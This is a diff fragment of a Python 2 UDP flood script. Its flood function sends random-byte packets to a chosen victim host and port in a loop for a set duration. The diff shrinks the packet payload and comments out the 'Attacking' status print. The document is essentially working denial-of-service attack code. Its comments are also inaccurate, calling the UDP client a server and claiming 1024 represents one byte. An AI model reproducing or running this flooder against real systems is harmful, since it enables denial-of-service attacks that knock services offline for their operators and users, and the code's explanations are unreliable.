@@ -18,7 +18,7 @@ def flood(victim, vport, duration):
     # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 1024 representes one byte to the server
-    bytes = random._urandom(51200)
+    bytes = random._urandom(1066)
     timeout =  time.time() + duration
     sent = 0
 
@@ -29,7 +29,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
+        #print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
